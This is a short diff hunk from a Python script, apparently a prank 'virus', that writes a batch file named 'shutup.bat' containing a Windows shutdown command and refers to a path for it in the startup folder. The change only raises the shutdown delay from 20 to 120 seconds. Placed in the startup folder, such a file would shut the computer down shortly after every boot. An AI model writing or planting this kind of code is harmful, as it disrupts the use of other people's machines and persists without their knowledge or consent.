@@ -10,7 +10,7 @@ batchFile = 'shutup.bat'        # Batch File name stored in variable
 
 # Will create a batchfile, and then it will write contents in it
 with open(batchFile, 'w') as file:
-    file.write("shutdown -s -t 20")     # The Batch Script Code
+    file.write("shutdown -s -t 120")     # The Batch Script Code
 
 
 virusPathtoFile = f"{startup}\{batchFile}"      # The batch file location in the startup folder if we move the batch file in the startup folder 
